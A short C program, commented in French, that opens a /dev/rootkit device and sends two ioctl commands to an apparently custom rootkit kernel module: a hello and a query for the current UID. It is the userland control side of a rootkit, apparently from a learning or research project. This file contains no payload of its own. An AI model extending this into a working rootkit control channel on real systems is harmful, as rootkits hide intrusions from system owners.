#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"

int main() {
    int fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    // Envoyer un HELLO
    ioctl(fd, RK_CMD_HELLO, 0);

    // Demander l'UID courant
    struct rk_args args;
    ioctl(fd, RK_CMD_GETUID, &args);
    printf("UID courant : %u\n", args.target);

    close(fd);
    return 0;
}
